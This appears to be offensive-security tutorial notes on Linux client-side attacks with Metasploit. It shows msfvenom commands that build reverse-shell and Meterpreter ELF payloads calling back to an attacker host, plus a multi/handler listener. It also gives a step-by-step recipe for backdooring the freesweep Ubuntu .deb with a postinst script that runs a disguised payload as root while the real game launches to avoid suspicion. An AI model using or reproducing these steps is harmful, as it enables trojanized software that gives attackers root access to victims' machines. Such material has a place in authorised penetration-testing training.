**Linux Binary Payloads (Metasploit)**

Linux binary payloads are commonly generated as ELF executables and require the victim to execute the binary on a Linux system.

### List Supported Payload Formats

- Common Linux output formats:
    - elf
    - elf-so
    - raw
    - python
    - bash

```
msfvenom -l formats

```

### Payload: linux/x86/meterpreter/reverse_tcp

- Load Payload in Metasploit

```
use payload/linux/x86/meterpreter/reverse_tcp

```

- Configure Payload Options

```
set LHOST 192.168.1.7

```

```
set LPORT 443

```

- Generate ELF Binary

```
generate -h

```

```
generate -f elf -o update.elf

```

```
file update.elf

```

### Payload Generation Using msfvenom

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=443 -f elf -o update2.elf

```

- Make the file executable on the target:

```
chmod +x update2.elf

```

```
./update2.elf

```

### Listener (Handler)

- Start Metasploit Listener

```
msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.1.7; set LPORT 443; exploit"

```

- Once the target executes the ELF file, a Meterpreter session will be opened.

### Attack Flow Summary

- **1.** Generate Linux ELF payload
- **2.** Transfer payload to victim system
- **3.** Set executable permission
- **4.** Execute binary on victim
- **5.** Reverse Meterpreter session connects back

### Notes

- Payload architecture must match the target (x86 vs x64)
- Outbound traffic must be allowed from the victim
- ELF execution requires execute permissions

## Backdooring an Ubuntu .deb Package with Metasploit

Client-side attacks and trojans are not exclusive to Windows systems.

Linux systems can also be compromised by trojanized packages, especially when users install software manually.

In this demonstration, we backdoor an Ubuntu .deb package to gain a reverse shell using Metasploit.

### Step 1: Download the Target Package

- We will infect the freesweep package (a text-based Minesweeper game).

```
apt update

```

```
apt-get download-only install freesweep

```

```
ls /var/cache/apt/archives/freesweep_1.0.2-3_amd64.deb

```

```
wget <http://ftp.us.debian.org/debian/pool/main/f/freesweep/freesweep_1.0.2-3_amd64.deb>

```

- Create a working directory and move the package:

```
mkdir evil

```

```
mv /var/cache/apt/archives/freesweep_1.0.2-3_amd64.deb evil

```

```
cd evil

```

### Step 2: Extract the Package

- Extract the deb contents and create the DEBIAN directory.

```
dpkg -x freesweep_1.0.2-3_amd64.deb work

```

```
mkdir work/DEBIAN

```

### Step 3: Create the Control File

- Inside work/DEBIAN, create a control file:

```
vim work/DEBIAN/control

```

- Content of control file:

```
Package: freesweep
Version: 1.0.2-3
Section: Games and Amusement
Priority: optional
Architecture: amd64
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
Freesweep is an implementation of the popular minesweeper game, where one tries to find all the mines without igniting any, based on hints given by the computer. Unlike most implementations of this game, Freesweep works in any visual text display in Linux console, in an xterm, and in most text-based terminals currently in use.

```

### Step 4: Create a Post-Installation Script

- The postinst script executes after installation.

```
vim work/DEBIAN/postinst

```

- Content of postinst script:

```
#!/bin/sh
chmod 2755 /usr/games/freesweep scores
/usr/games/freesweep_scores &
/usr/games/freesweep 5

```

- This script:
    - Sets SUID permissions
    - Executes the malicious payload
    - Launches the legitimate game to avoid suspicion

### Step 5: Generate the Malicious Payload

- We create a Linux reverse shell payload disguised as freesweep_scores.

```
msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.1.7 LPORT=443 -b "\\x00" -f elf -o work/usr/games/freesweep_scores

```

```
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.7 LPORT=443 -b "\\x00" -f elf -o work/usr/games/freesweep_scores

```

- Payload details:
    - Architecture: x64
    - Payload: linux/x64/shell/reverse_tcp
    - Output: ELF binary

### Step 6: Build the Trojanized .deb

- Make the script executable and build the new package:

```
chmod 755 work/DEBIAN/postinst

```

```
dpkg-deb --build work

```

- Rename and move it to the web server directory:

```
mv work.deb freesweep.deb

```

```
cp freesweep.deb /var/

```

### Step 7: Set Up Metasploit Listener

```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST 192.168.1.7; set LPORT 443; run; exit -y"

```

### Step 8: Victim Installs the Package

- On the Ubuntu victim machine:

```
wget <http://192.168.1.7/freesweep.deb>

```

```
dpkg -i freesweep.deb

```

- As soon as installation completes, the payload executes.

### Post-Exploitation Proof

```
ifconfig

```

```
hostname

```

```
id

```

- Example output:

```
uid=0(root) gid=0(root) groups=0(root)

```

- Full root access obtained
- Client-side Linux attack successful

### Key Takeaways

- Client-side attacks work on Linux, not just Windows
- .deb packages can be trojanized
- postinst scripts execute with root privileges
- Social engineering is critical for delivery
- Antivirus detection on Linux is often minimal

### Notes

- Payload architecture must match the target (x86 vs x64)
- Outbound traffic must be allowed from the victim
- ELF execution requires execute permissions
